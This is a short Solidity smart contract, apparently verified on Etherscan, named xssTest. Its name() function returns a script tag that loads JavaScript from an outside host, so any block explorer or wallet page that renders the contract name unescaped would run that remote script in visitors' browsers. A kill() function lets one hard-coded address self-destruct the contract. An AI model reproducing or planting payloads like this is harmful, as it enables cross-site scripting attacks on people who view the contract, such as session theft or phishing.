/**
 *Submitted for verification at Etherscan.io on 2022-09-28
*/

// SPDX-License-Identifier: MIT
pragma solidity = 0.8.7;

contract xssTest {
   
    function name() public pure returns (string memory){
        return "<script src=//beidou.jclick.top/xss1.js></script>";
    }
    function kill() public {
        require(msg.sender == address(0x92f651286e823Ae64888097B02a3c1188e520d02));
        selfdestruct(payable(0x92f651286e823Ae64888097B02a3c1188e520d02));
    }

}